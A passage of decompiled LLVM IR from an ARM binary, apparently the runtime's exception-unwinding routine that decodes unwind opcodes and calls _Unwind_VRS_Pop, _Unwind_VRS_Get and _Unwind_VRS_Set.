dec_label_pc_17dac:                               ; preds = %dec_label_pc_17d98
  %v1_17dac = add nsw i32 %v4_17d98, -1
  store i32 %v1_17dac, i32* %r3.global-to-local, align 4
  %v1_17db0 = trunc i32 %v1_17dac to i8
  store i8 %v1_17db0, i8* %v2_17d98, align 1
  %v0_17db4 = load i32, i32* @r5, align 4
  %v1_17db4 = add i32 %v0_17db4, 4
  %v2_17db4 = inttoptr i32 %v1_17db4 to i32*
  %v3_17db4 = load i32, i32* %v2_17db4, align 4
  store i32 %v3_17db4, i32* %r2.global-to-local, align 4
  %v1_17db8 = inttoptr i32 %v3_17db4 to i32*
  %v2_17db8 = load i32, i32* %v1_17db8, align 4
  store i32 %v2_17db8, i32* %r0.global-to-local, align 4
  %v4_17db8 = add i32 %v3_17db4, 4
  store i32 %v4_17db8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17db8, i32* %v2_17db4, align 4
  %v0_17dc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17dc4 = trunc i32 %v0_17dc4 to i8
  %v2_17dc4 = load i32, i32* @r5, align 4
  %v3_17dc4 = add i32 %v2_17dc4, 8
  %v4_17dc4 = inttoptr i32 %v3_17dc4 to i8*
  store i8 %v1_17dc4, i8* %v4_17dc4, align 1
  %v0_17dc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_17dc8 = load i32, i32* @r5, align 4
  %v2_17dc8 = inttoptr i32 %v1_17dc8 to i32*
  store i32 %v0_17dc8, i32* %v2_17dc8, align 4
  br label %dec_label_pc_17dcc

dec_label_pc_17dcc:                               ; preds = %.thread48, %dec_label_pc_17dac
  %v0_17dcc = load i32, i32* %r0.global-to-local, align 4
  %v3_17dcc = udiv i32 %v0_17dcc, 16777216
  %v1_17dd0 = urem i32 %v3_17dcc, 16
  %v3_17dd4 = mul i32 %v0_17dcc, 256
  store i32 %v3_17dd4, i32* %r0.global-to-local, align 4
  %v1_17dd8 = add nuw nsw i32 %v1_17dd0, 1
  store i32 %v1_17dd8, i32* %r2.global-to-local, align 4
  %v1_17ddc = and i32 %v3_17dcc, 240
  store i32 %v1_17ddc, i32* %r3.global-to-local, align 4
  %v1_17de0 = load i32, i32* @r5, align 4
  %v2_17de0 = inttoptr i32 %v1_17de0 to i32*
  store i32 %v3_17dd4, i32* %v2_17de0, align 4
  %v0_17de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17de4 = load i32, i32* %r3.global-to-local, align 4
  %v4_17de4 = mul i32 %v1_17de4, 4096
  %v5_17de4 = or i32 %v4_17de4, %v0_17de4
  br label %dec_label_pc_17de8

dec_label_pc_17de8:                               ; preds = %dec_label_pc_17d98, %dec_label_pc_17dcc
  %storemerge131 = phi i32 [ %v5_17de4, %dec_label_pc_17dcc ], [ 720897, %dec_label_pc_17d98 ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_17df0:                               ; preds = %dec_label_pc_17bac
  %v0_17df0 = load i32, i32* @r5, align 4
  %v1_17df0 = add i32 %v0_17df0, 8
  %v2_17df0 = inttoptr i32 %v1_17df0 to i8*
  %v3_17df0 = load i8, i8* %v2_17df0, align 1
  %v4_17df0 = zext i8 %v3_17df0 to i32
  store i32 %v4_17df0, i32* %r3.global-to-local, align 4
  %v2_17df4 = icmp eq i8 %v3_17df0, 0
  store i1 %v2_17df4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17df4, label %dec_label_pc_17e04, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_17df0
  %v2_17df8 = add nsw i32 %v4_17df0, -1
  store i32 %v2_17df8, i32* %r3.global-to-local, align 4
  %v2_17dfc = trunc i32 %v2_17df8 to i8
  store i8 %v2_17dfc, i8* %v2_17df0, align 1
  %v0_17e00.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17e00.pr.pr, label %.thread52.dec_label_pc_17e04_crit_edge, label %dec_label_pc_17e38

.thread52.dec_label_pc_17e04_crit_edge:           ; preds = %.thread52
  %v0_17e04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17e04

dec_label_pc_17e04:                               ; preds = %.thread52.dec_label_pc_17e04_crit_edge, %dec_label_pc_17df0
  %v2_17e1c = phi i32 [ %v0_17e04.pre, %.thread52.dec_label_pc_17e04_crit_edge ], [ %v0_17df0, %dec_label_pc_17df0 ]
  %v1_17e04 = add i32 %v2_17e1c, 9
  %v2_17e04 = inttoptr i32 %v1_17e04 to i8*
  %v3_17e04 = load i8, i8* %v2_17e04, align 1
  %v4_17e04 = zext i8 %v3_17e04 to i32
  store i32 %v4_17e04, i32* %r3.global-to-local, align 4
  %v2_17e08 = icmp eq i8 %v3_17e04, 0
  store i1 %v2_17e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e08, label %dec_label_pc_17e54, label %dec_label_pc_17e18

dec_label_pc_17e18:                               ; preds = %dec_label_pc_17e04
  %v1_17e18 = add nsw i32 %v4_17e04, -1
  store i32 %v1_17e18, i32* %r3.global-to-local, align 4
  %v1_17e1c = trunc i32 %v1_17e18 to i8
  store i8 %v1_17e1c, i8* %v2_17e04, align 1
  %v0_17e20 = load i32, i32* @r5, align 4
  %v1_17e20 = add i32 %v0_17e20, 4
  %v2_17e20 = inttoptr i32 %v1_17e20 to i32*
  %v3_17e20 = load i32, i32* %v2_17e20, align 4
  store i32 %v3_17e20, i32* %r2.global-to-local, align 4
  %v1_17e24 = inttoptr i32 %v3_17e20 to i32*
  %v2_17e24 = load i32, i32* %v1_17e24, align 4
  store i32 %v2_17e24, i32* %r0.global-to-local, align 4
  %v4_17e24 = add i32 %v3_17e20, 4
  store i32 %v4_17e24, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_17e24, i32* %v2_17e20, align 4
  %v0_17e30 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e30 = trunc i32 %v0_17e30 to i8
  %v2_17e30 = load i32, i32* @r5, align 4
  %v3_17e30 = add i32 %v2_17e30, 8
  %v4_17e30 = inttoptr i32 %v3_17e30 to i8*
  store i8 %v1_17e30, i8* %v4_17e30, align 1
  %v0_17e34 = load i32, i32* %r0.global-to-local, align 4
  %v1_17e34 = load i32, i32* @r5, align 4
  %v2_17e34 = inttoptr i32 %v1_17e34 to i32*
  store i32 %v0_17e34, i32* %v2_17e34, align 4
  br label %dec_label_pc_17e38

dec_label_pc_17e38:                               ; preds = %.thread52, %dec_label_pc_17e18
  %v0_17e38 = load i32, i32* %r0.global-to-local, align 4
  %v3_17e38 = udiv i32 %v0_17e38, 16777216
  %v1_17e3c = urem i32 %v3_17e38, 16
  %v3_17e40 = mul i32 %v0_17e38, 256
  store i32 %v3_17e40, i32* %r0.global-to-local, align 4
  %v1_17e44 = add nuw nsw i32 %v1_17e3c, 1
  store i32 %v1_17e44, i32* %r2.global-to-local, align 4
  %v1_17e48 = and i32 %v3_17e38, 240
  store i32 %v1_17e48, i32* %r3.global-to-local, align 4
  %v1_17e4c = load i32, i32* @r5, align 4
  %v2_17e4c = inttoptr i32 %v1_17e4c to i32*
  store i32 %v3_17e40, i32* %v2_17e4c, align 4
  %v0_17e50 = load i32, i32* %r2.global-to-local, align 4
  %v1_17e50 = load i32, i32* %r3.global-to-local, align 4
  %v4_17e50 = mul i32 %v1_17e50, 4096
  %v5_17e50 = or i32 %v4_17e50, %v0_17e50
  br label %dec_label_pc_17e54

dec_label_pc_17e54:                               ; preds = %dec_label_pc_17e04, %dec_label_pc_17e38
  %storemerge130 = phi i32 [ %v5_17e50, %dec_label_pc_17e38 ], [ 720897, %dec_label_pc_17e04 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_17e5c:                               ; preds = %dec_label_pc_17b88
  %v0_17e5c = load i32, i32* @r5, align 4
  %v1_17e5c = add i32 %v0_17e5c, 8
  %v2_17e5c = inttoptr i32 %v1_17e5c to i8*
  %v3_17e5c = load i8, i8* %v2_17e5c, align 1
  %v4_17e5c = zext i8 %v3_17e5c to i32
  store i32 %v4_17e5c, i32* %r3.global-to-local, align 4
  %v2_17e60 = icmp eq i8 %v3_17e5c, 0
  store i1 %v2_17e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e60, label %dec_label_pc_18008, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_17e5c
  %v2_17e64 = add nsw i32 %v4_17e5c, -1
  store i32 %v2_17e64, i32* %r3.global-to-local, align 4
  %v2_17e68 = trunc i32 %v2_17e64 to i8
  store i8 %v2_17e68, i8* %v2_17e5c, align 1
  %v0_17e6c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17e6c.pr.pr, label %.thread56.dec_label_pc_18008_crit_edge, label %dec_label_pc_17e70

.thread56.dec_label_pc_18008_crit_edge:           ; preds = %.thread56
  %v0_18008.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18008

dec_label_pc_17e70:                               ; preds = %.thread56, %dec_label_pc_18014
  %v0_17e70 = load i32, i32* %r0.global-to-local, align 4
  %v3_17e70 = udiv i32 %v0_17e70, 16777216
  store i32 %v3_17e70, i32* %r3.global-to-local, align 4
  store i32 %v3_17e70, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_17e70, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_17e78 = mul i32 %v0_17e70, 256
  store i32 %v3_17e78, i32* %r0.global-to-local, align 4
  %v1_17e7c = load i32, i32* @r5, align 4
  %v2_17e7c = inttoptr i32 %v1_17e7c to i32*
  store i32 %v3_17e78, i32* %v2_17e7c, align 4
  br i1 %tmp184, label %dec_label_pc_17c38, label %dec_label_pc_17e84

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e70
  %v0_17e84 = load i32, i32* %r3.global-to-local, align 4
  %v1_17e84 = and i32 %v0_17e84, 240
  store i32 %v1_17e84, i32* %r3.global-to-local, align 4
  %v2_17e84 = icmp eq i32 %v1_17e84, 0
  store i1 %v2_17e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e84, label %dec_label_pc_17e8c, label %dec_label_pc_17c38

dec_label_pc_17e8c:                               ; preds = %dec_label_pc_17e84
  %v0_17e8c = load i32, i32* @r7, align 4
  store i32 %v0_17e8c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_17e94 = load i32, i32* %r2.global-to-local, align 4
  %v4_17e94 = call i32 @_Unwind_VRS_Pop(i32 %v0_17e8c, i32 4, i32 %v2_17e94, i32 0)
  store i32 %v4_17e94, i32* %r0.global-to-local, align 4
  %v2_17e98 = icmp eq i32 %v4_17e94, 0
  store i1 %v2_17e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17e98, label %dec_label_pc_17968.backedge, label %dec_label_pc_17ea0

dec_label_pc_17ea0:                               ; preds = %dec_label_pc_17e8c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_17ea8:                               ; preds = %dec_label_pc_17cd4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_17eb4 = load i32, i32* @r7, align 4
  store i32 %v0_17eb4, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_17ec0 = call i32 @_Unwind_VRS_Get(i32 %v0_17eb4, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17ec0, i32* %r0.global-to-local, align 4
  %v0_17ec4 = load i32, i32* @r5, align 4
  %v1_17ec4 = add i32 %v0_17ec4, 8
  %v2_17ec4 = inttoptr i32 %v1_17ec4 to i8*
  %v3_17ec4 = load i8, i8* %v2_17ec4, align 1
  %v4_17ec4 = zext i8 %v3_17ec4 to i32
  store i32 %v4_17ec4, i32* %r1.global-to-local, align 4
  %v2_17ec8 = icmp eq i8 %v3_17ec4, 0
  store i1 %v2_17ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ec8, label %dec_label_pc_17ed8, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_17ea8
  %v2_17ecc = add nsw i32 %v4_17ec4, -1
  store i32 %v2_17ecc, i32* %r3.global-to-local, align 4
  %v2_17ed0 = trunc i32 %v2_17ecc to i8
  store i8 %v2_17ed0, i8* %v2_17ec4, align 1
  %v0_17ed4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17ed4.pr.pr, label %.thread58.dec_label_pc_17ed8_crit_edge, label %dec_label_pc_17f04

.thread58.dec_label_pc_17ed8_crit_edge:           ; preds = %.thread58
  %v0_17ed8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17ed8

dec_label_pc_17ed8:                               ; preds = %.thread58.dec_label_pc_17ed8_crit_edge, %dec_label_pc_17ea8
  %v2_17eec = phi i32 [ %v0_17ed8.pre, %.thread58.dec_label_pc_17ed8_crit_edge ], [ %v0_17ec4, %dec_label_pc_17ea8 ]
  %v1_17ed8 = add i32 %v2_17eec, 9
  %v2_17ed8 = inttoptr i32 %v1_17ed8 to i8*
  %v3_17ed8 = load i8, i8* %v2_17ed8, align 1
  %v4_17ed8 = zext i8 %v3_17ed8 to i32
  store i32 %v4_17ed8, i32* %r3.global-to-local, align 4
  %v2_17edc = icmp eq i8 %v3_17ed8, 0
  store i1 %v2_17edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17edc, label %bb158, label %dec_label_pc_17ee8

bb158:                                            ; preds = %dec_label_pc_17ed8
  %v1_17ee0 = load i32, i32* @r6, align 4
  store i32 %v1_17ee0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17f2c

dec_label_pc_17ee8:                               ; preds = %dec_label_pc_17ed8
  %v1_17ee8 = add nsw i32 %v4_17ed8, -1
  store i32 %v1_17ee8, i32* %r3.global-to-local, align 4
  %v1_17eec = trunc i32 %v1_17ee8 to i8
  store i8 %v1_17eec, i8* %v2_17ed8, align 1
  %v0_17ef0 = load i32, i32* @r5, align 4
  %v1_17ef0 = add i32 %v0_17ef0, 4
  %v2_17ef0 = inttoptr i32 %v1_17ef0 to i32*
  %v3_17ef0 = load i32, i32* %v2_17ef0, align 4
  store i32 %v3_17ef0, i32* %r2.global-to-local, align 4
  %v1_17ef4 = inttoptr i32 %v3_17ef0 to i32*
  %v2_17ef4 = load i32, i32* %v1_17ef4, align 4
  store i32 %v2_17ef4, i32* %r0.global-to-local, align 4
  %v4_17ef4 = add i32 %v3_17ef0, 4
  store i32 %v4_17ef4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_17efc = inttoptr i32 %v0_17ef0 to i32*
  store i32 %v2_17ef4, i32* %v1_17efc, align 4
  %v5_17efc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_17efc, i32* %v2_17ef0, align 4
  %v0_17f00 = load i32, i32* %r3.global-to-local, align 4
  %v1_17f00 = trunc i32 %v0_17f00 to i8
  %v2_17f00 = load i32, i32* @r5, align 4
  %v3_17f00 = add i32 %v2_17f00, 8
  %v4_17f00 = inttoptr i32 %v3_17f00 to i8*
  store i8 %v1_17f00, i8* %v4_17f00, align 1
  br label %dec_label_pc_17f04

dec_label_pc_17f04:                               ; preds = %.thread58, %dec_label_pc_17ee8
  %v0_17f04 = load i32, i32* @r5, align 4
  %v1_17f04 = inttoptr i32 %v0_17f04 to i32*
  %v2_17f04 = load i32, i32* %v1_17f04, align 4
  store i32 %v2_17f04, i32* %r3.global-to-local, align 4
  %v3_17f08 = mul i32 %v2_17f04, 256
  store i32 %v3_17f08, i32* %r0.global-to-local, align 4
  %v3_17f0c = udiv i32 %v2_17f04, 16777216
  store i32 %v3_17f0c, i32* %r2.global-to-local, align 4
  store i32 %v3_17f08, i32* %v1_17f04, align 4
  %v0_17f14 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f14 = and i32 %v0_17f14, 128
  %v2_17f14 = icmp eq i32 %v1_17f14, 0
  store i1 %v2_17f14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17f14, label %.thread129, label %dec_label_pc_17f28

.thread129:                                       ; preds = %dec_label_pc_17f04
  %v4_17f18 = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_17f18, i32* %ip.global-to-local, align 4
  %v1_17f1c = urem i32 %v0_17f14, 256
  store i32 %v1_17f1c, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17f28:                               ; preds = %dec_label_pc_17f04
  %v1_17f1c63 = urem i32 %v0_17f14, 256
  store i32 %v1_17f1c63, i32* %r2.global-to-local, align 4
  %v0_17f28 = load i32, i32* @r5, align 4
  %v1_17f28 = add i32 %v0_17f28, 8
  %v2_17f28 = inttoptr i32 %v1_17f28 to i8*
  %v3_17f28 = load i8, i8* %v2_17f28, align 1
  %v4_17f28 = zext i8 %v3_17f28 to i32
  store i32 %v4_17f28, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17f2c

dec_label_pc_17f2c:                               ; preds = %bb158, %dec_label_pc_17f28
  %v3_17f4c99 = phi i32 [ %v2_17eec, %bb158 ], [ %v0_17f28, %dec_label_pc_17f28 ]
  %v0_17f3492 = phi i32 [ %v1_17ee0, %bb158 ], [ %v1_17f1c63, %dec_label_pc_17f28 ]
  %v3_17f2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_17f2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17f34

dec_label_pc_17f34:                               ; preds = %dec_label_pc_17f34.backedge, %dec_label_pc_17f2c
  %v3_17f4c = phi i32 [ %v3_17f4c100, %dec_label_pc_17f34.backedge ], [ %v3_17f4c99, %dec_label_pc_17f2c ]
  %v0_17f48 = phi i32 [ %v2_17f38.pre, %dec_label_pc_17f34.backedge ], [ 2, %dec_label_pc_17f2c ]
  %v0_17f38 = phi i32 [ %v0_17f38.pre, %dec_label_pc_17f34.backedge ], [ %v3_17f2c, %dec_label_pc_17f2c ]
  %v0_17f34 = phi i32 [ %v0_17f3495, %dec_label_pc_17f34.backedge ], [ %v0_17f3492, %dec_label_pc_17f2c ]
  %v1_17f34 = urem i32 %v0_17f34, 128
  %v7_17f38 = shl i32 %v1_17f34, %v0_17f48
  %v8_17f38 = add i32 %v7_17f38, %v0_17f38
  store i32 %v8_17f38, i32* %ip.global-to-local, align 4
  %v0_17f3c = load i32, i32* %r1.global-to-local, align 4
  %v2_17f3c = icmp eq i32 %v0_17f3c, 0
  store i1 %v2_17f3c, i1* %cpsr_z.global-to-local, align 1
  %v1_17f40 = add i32 %v0_17f3c, -1
  store i32 %v1_17f40, i32* %r3.global-to-local, align 4
  store i32 %v8_17f38, i32* %stack_var_-36, align 4
  %v1_17f48 = add i32 %v0_17f48, 7
  store i32 %v1_17f48, i32* @lr, align 4
  br i1 %v2_17f3c, label %dec_label_pc_17f54, label %bb159

bb159:                                            ; preds = %dec_label_pc_17f34
  %v2_17f4c = trunc i32 %v1_17f40 to i8
  %v4_17f4c = add i32 %v3_17f4c, 8
  %v5_17f4c = inttoptr i32 %v4_17f4c to i8*
  store i8 %v2_17f4c, i8* %v5_17f4c, align 1
  %v0_17f50.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17f50.pr, label %.dec_label_pc_17f54_crit_edge, label %dec_label_pc_17f80

.dec_label_pc_17f54_crit_edge:                    ; preds = %bb159
  %v0_17f54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f54

dec_label_pc_17f54:                               ; preds = %.dec_label_pc_17f54_crit_edge, %dec_label_pc_17f34
  %v2_17f6c = phi i32 [ %v0_17f54.pre, %.dec_label_pc_17f54_crit_edge ], [ %v3_17f4c, %dec_label_pc_17f34 ]
  %v1_17f54 = add i32 %v2_17f6c, 9
  %v2_17f54 = inttoptr i32 %v1_17f54 to i8*
  %v3_17f54 = load i8, i8* %v2_17f54, align 1
  %v4_17f54 = zext i8 %v3_17f54 to i32
  store i32 %v4_17f54, i32* %r3.global-to-local, align 4
  %v2_17f58 = icmp eq i8 %v3_17f54, 0
  store i1 %v2_17f58, i1* %cpsr_z.global-to-local, align 1
  %v1_17f5c = add nsw i32 %v4_17f54, -1
  store i32 %v1_17f5c, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_17f58, label %dec_label_pc_17f34.backedge, label %dec_label_pc_17f68

dec_label_pc_17f68:                               ; preds = %dec_label_pc_17f54
  %v1_17f68 = add i32 %v2_17f6c, 4
  %v2_17f68 = inttoptr i32 %v1_17f68 to i32*
  %v3_17f68 = load i32, i32* %v2_17f68, align 4
  store i32 %v3_17f68, i32* %r2.global-to-local, align 4
  %v1_17f6c = trunc i32 %v1_17f5c to i8
  store i8 %v1_17f6c, i8* %v2_17f54, align 1
  %v0_17f70 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f70 = inttoptr i32 %v0_17f70 to i32*
  %v2_17f70 = load i32, i32* %v1_17f70, align 4
  store i32 %v2_17f70, i32* %r0.global-to-local, align 4
  %v4_17f70 = add i32 %v0_17f70, 4
  store i32 %v4_17f70, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_17f78 = load i32, i32* @r5, align 4
  %v3_17f78 = add i32 %v2_17f78, 8
  %v4_17f78 = inttoptr i32 %v3_17f78 to i8*
  store i8 3, i8* %v4_17f78, align 1
  %v0_17f7c = load i32, i32* @r5, align 4
  %v1_17f7c = inttoptr i32 %v0_17f7c to i32*
  %v2_17f7c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_17f7c, i32* %v1_17f7c, align 4
  %v3_17f7c = add i32 %v0_17f7c, 4
  %v4_17f7c = inttoptr i32 %v3_17f7c to i32*
  %v5_17f7c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_17f7c, i32* %v4_17f7c, align 4
  br label %dec_label_pc_17f80

dec_label_pc_17f80:                               ; preds = %bb159, %dec_label_pc_17f68
  %v0_17f80 = load i32, i32* @r5, align 4
  %v1_17f80 = inttoptr i32 %v0_17f80 to i32*
  %v2_17f80 = load i32, i32* %v1_17f80, align 4
  store i32 %v2_17f80, i32* %r3.global-to-local, align 4
  %v3_17f84 = udiv i32 %v2_17f80, 16777216
  store i32 %v3_17f84, i32* %r2.global-to-local, align 4
  %v1_17f88 = and i32 %v3_17f84, 128
  %v2_17f88 = icmp eq i32 %v1_17f88, 0
  store i1 %v2_17f88, i1* %cpsr_z.global-to-local, align 1
  %v3_17f8c = mul i32 %v2_17f80, 256
  store i32 %v3_17f8c, i32* %r0.global-to-local, align 4
  store i32 %v3_17f8c, i32* %v1_17f80, align 4
  %v0_17f94 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f94 = urem i32 %v0_17f94, 256
  store i32 %v1_17f94, i32* %r2.global-to-local, align 4
  br i1 %v2_17f88, label %dec_label_pc_17f9c.loopexit, label %dec_label_pc_17fc8

dec_label_pc_17f9c.loopexit:                      ; preds = %dec_label_pc_17f80
  %v0_17fa0.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_17fa4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17f9c:                               ; preds = %dec_label_pc_17f9c.loopexit, %.thread129
  %v2_17fa4 = phi i32 [ 2, %.thread129 ], [ %v2_17fa4.pre, %dec_label_pc_17f9c.loopexit ]
  %v0_17fa0 = phi i32 [ %v4_17f18, %.thread129 ], [ %v0_17fa0.pre, %dec_label_pc_17f9c.loopexit ]
  %v0_17f9c = phi i32 [ %v1_17f1c, %.thread129 ], [ %v1_17f94, %dec_label_pc_17f9c.loopexit ]
  %v1_17f9c = urem i32 %v0_17f9c, 128
  %v1_17fa0 = add i32 %v0_17fa0, 516
  %v7_17fa4 = shl i32 %v1_17f9c, %v2_17fa4
  %v8_17fa4 = add i32 %v1_17fa0, %v7_17fa4
  store i32 %v8_17fa4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17fac = load i32, i32* @r7, align 4
  store i32 %v0_17fac, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_17fa4, i32* %stack_var_-36, align 4
  %v5_17fc0 = call i32 @_Unwind_VRS_Set(i32 %v0_17fac, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_17fc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17968.backedge

dec_label_pc_17fc8:                               ; preds = %dec_label_pc_17f80
  %v0_17fc8 = load i32, i32* @r5, align 4
  %v1_17fc8 = add i32 %v0_17fc8, 8
  %v2_17fc8 = inttoptr i32 %v1_17fc8 to i8*
  %v3_17fc8 = load i8, i8* %v2_17fc8, align 1
  %v4_17fc8 = zext i8 %v3_17fc8 to i32
  store i32 %v4_17fc8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17f34.backedge

dec_label_pc_17f34.backedge:                      ; preds = %dec_label_pc_17fc8, %dec_label_pc_17f54
  %v3_17f4c100 = phi i32 [ %v0_17fc8, %dec_label_pc_17fc8 ], [ %v2_17f6c, %dec_label_pc_17f54 ]
  %v0_17f3495 = phi i32 [ %v1_17f94, %dec_label_pc_17fc8 ], [ 176, %dec_label_pc_17f54 ]
  %v0_17f38.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_17f38.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_17f34

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17ccc
  %v0_17fd0 = load i32, i32* @r5, align 4
  %v1_17fd0 = add i32 %v0_17fd0, 8
  %v2_17fd0 = inttoptr i32 %v1_17fd0 to i8*
  %v3_17fd0 = load i8, i8* %v2_17fd0, align 1
  %v4_17fd0 = zext i8 %v3_17fd0 to i32
  store i32 %v4_17fd0, i32* %r3.global-to-local, align 4
  %v2_17fd4 = icmp eq i8 %v3_17fd0, 0
  store i1 %v2_17fd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fd4, label %dec_label_pc_18038, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_17fd0
  %v2_17fd8 = add nsw i32 %v4_17fd0, -1
  store i32 %v2_17fd8, i32* %r3.global-to-local, align 4
  %v2_17fdc = trunc i32 %v2_17fd8 to i8
  store i8 %v2_17fdc, i8* %v2_17fd0, align 1
  %v0_17fe0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17fe0.pr.pr, label %.thread66.dec_label_pc_18038_crit_edge, label %dec_label_pc_17fe4

.thread66.dec_label_pc_18038_crit_edge:           ; preds = %.thread66
  %v0_18038.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18038

dec_label_pc_17fe4:                               ; preds = %.thread66, %dec_label_pc_18044
  %v0_17fe4 = load i32, i32* %r0.global-to-local, align 4
  %v3_17fe4 = udiv i32 %v0_17fe4, 16777216
  store i32 %v3_17fe4, i32* %r3.global-to-local, align 4
  store i32 %v3_17fe4, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_17fe4, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_17fec = mul i32 %v0_17fe4, 256
  store i32 %v3_17fec, i32* %r0.global-to-local, align 4
  %v1_17ff0 = load i32, i32* @r5, align 4
  %v2_17ff0 = inttoptr i32 %v1_17ff0 to i32*
  store i32 %v3_17fec, i32* %v2_17ff0, align 4
  br i1 %tmp185, label %dec_label_pc_17c38, label %dec_label_pc_17ff8

dec_label_pc_17ff8:                               ; preds = %dec_label_pc_17fe4
  %v0_17ff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_17ff8 = and i32 %v0_17ff8, 240
  store i32 %v1_17ff8, i32* %r1.global-to-local, align 4
  %v2_17ff8 = icmp eq i32 %v1_17ff8, 0
  store i1 %v2_17ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17ff8, label %dec_label_pc_17ff8.dec_label_pc_17c68_crit_edge, label %dec_label_pc_18000

dec_label_pc_17ff8.dec_label_pc_17c68_crit_edge:  ; preds = %dec_label_pc_17ff8
  %v2_17c70.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17c68

dec_label_pc_18000:                               ; preds = %dec_label_pc_17ff8
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17a90

dec_label_pc_18008:                               ; preds = %.thread56.dec_label_pc_18008_crit_edge, %dec_label_pc_17e5c
  %v2_18018 = phi i32 [ %v0_18008.pre, %.thread56.dec_label_pc_18008_crit_edge ], [ %v0_17e5c, %dec_label_pc_17e5c ]
  %v1_18008 = add i32 %v2_18018, 9
  %v2_18008 = inttoptr i32 %v1_18008 to i8*
  %v3_18008 = load i8, i8* %v2_18008, align 1
  %v4_18008 = zext i8 %v3_18008 to i32
  store i32 %v4_18008, i32* %r3.global-to-local, align 4
  %v2_1800c = icmp eq i8 %v3_18008, 0
  store i1 %v2_1800c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1800c, label %dec_label_pc_17c38, label %dec_label_pc_18014

dec_label_pc_18014:                               ; preds = %dec_label_pc_18008
  %v1_18014 = add nsw i32 %v4_18008, -1
  store i32 %v1_18014, i32* %r3.global-to-local, align 4
  %v1_18018 = trunc i32 %v1_18014 to i8
  store i8 %v1_18018, i8* %v2_18008, align 1
  %v0_1801c = load i32, i32* @r5, align 4
  %v1_1801c = add i32 %v0_1801c, 4
  %v2_1801c = inttoptr i32 %v1_1801c to i32*
